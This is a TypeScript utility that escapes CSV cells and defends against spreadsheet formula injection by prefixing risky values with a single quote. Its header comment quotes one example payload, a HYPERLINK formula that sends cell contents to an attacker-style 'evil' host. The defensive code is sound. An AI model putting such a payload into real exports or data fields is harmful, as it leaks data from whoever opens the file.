/**
 * CSV cell encoding with spreadsheet formula-injection (CSV injection)
 * neutralisation.
 *
 * Excel / LibreOffice / Google Sheets execute a cell as a formula when it
 * starts with `=`, `+`, `-`, `@`, TAB or CR — e.g. an audit-log entity name
 * or an admin's last name set to `=HYPERLINK("http://evil/?"&A1,"x")` would
 * run on the auditor's machine when they open the export. Per OWASP, such
 * cells are prefixed with a single quote so they render as literal text.
 *
 * Then standard RFC 4180 quoting: wrap in double quotes when the value
 * contains a comma, quote, CR or LF, and double any embedded quotes.
 *
 * Reusable for any CSV export in the API.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

export function neutraliseCsvFormula(value: string): string {
  return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
}

export function escapeCsvCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  const str = neutraliseCsvFormula(String(value));
  if (/[",\r\n]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

export function toCsvRow(cells: unknown[]): string {
  return cells.map(escapeCsvCell).join(',');
}
